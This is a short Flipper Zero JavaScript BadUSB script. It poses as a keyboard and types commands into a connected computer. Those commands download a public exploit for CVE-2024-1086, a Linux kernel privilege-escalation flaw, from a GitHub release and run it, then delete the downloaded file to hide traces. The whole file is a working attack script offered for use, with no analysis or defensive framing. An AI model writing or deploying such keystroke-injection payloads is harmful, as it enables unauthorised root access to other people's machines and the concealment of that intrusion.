/* Flipper Zero JavaScript BadUSB */
let badusb = require('badusb');
let notify = require('notification');
let flipper = require('flipper');
let dialog = require('dialog');

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: 'Flipper', prod_name: 'Zero' });

dialog.message('BADUSB', 'Press OK to start');

if (badusb.isConnected()) {
    notify.blink('green', 'short');
    console.log('USB is connected');
	delay(1000);
	delay(500);
	badusb.println("wget https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit && chmod +x exploit && ./exploit");
	badusb.press('ENTER');
	delay(5500);
	badusb.println("rm -rf exploit*");
	badusb.press('ENTER');
	badusb.println("exit");
	badusb.press('ENTER');


    notify.success();
} else {
    console.log('USB not connected');
    notify.error();
}

badusb.quit();
    